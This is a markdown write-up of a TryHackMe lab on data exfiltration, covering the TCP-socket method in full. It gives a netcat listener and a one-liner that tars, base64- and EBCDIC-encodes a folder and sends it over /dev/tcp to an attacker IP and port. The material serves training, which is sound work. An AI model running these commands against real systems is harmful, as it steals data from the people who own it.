# Data Exfiltration

The Data Exfiltration is the process of transferring data from a system or network without authorization. This type of attack typically involves obtaining and extracting sensitive or confidential information, such as personal, financial, or corporate data, without the consent of the data owner. Data exfiltration is used to hide an adversary's malicious activities and bypass security products. For example, the DNS exfiltration technique can evade security products, such as a firewall.

Data exfiltration can have severe consequences for an organization or individual, including financial loss, reputational damage, and privacy breaches.

<p align="center">
  <img width="600" height="450" src="./img/1.JPG">
</p>

Here we will use some techniques below to exemplify data theft;

* TCP Socket
* SSH
* HTTP(s)
* ICMP
* DNS

For this study, we used the **TryHackMe** room as an example ([TryHackMe - Data Exfiltration ](https://tryhackme.com/r/room/dataxexfilt)).

## TCP Socket

In this topic, we will use the TCP protocol to transfer data from an already compressed host. This is the simplest technique, where we know that there is a weak security system.

<p align="center">
  <img width="650" height="200" src="./img/2.JPG">
</p>

1. To exfiltrate the data, the hacker opens port 15251 (uncommon).
2. The hacker opens port 1337 to receive data.
3. The victim communicates with the hacker and begins transferring data.

### Starting the Attack



* Let's use NC (NetCat) to start a listener on the attacker. In this step, we will transfer all data received on port 1337 to the **data.txt** file.

```
nc -lvp 1337 > /tmp/data.txt
```
* On the victim, we will begin transfers to the attacking host.

```
tar zcf - /tmp/files/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/1337
```
1. We use TAR to compress the files folder.
2. We convert TAR to base64.
3. We then convert the base64 to a backup file, using dd and EBCDIC encoding.
4. we direct all this code to the TCP socket, sent to 1337 from the attacker.

Below we can see the sending and receiving of data via TCP socket.

* On the victim's machine, I am sending files from the **/tmp/files** folder

<p align="center">
  <img width="800" height="120" src="./img/4.JPG">
</p>

* On the attacker's computer, we receive the data on port 1337 and reverse the DD, base64 and TAR encoding.

<p align="center">
  <img width="800" height="300" src="./img/5.JPG">
</p>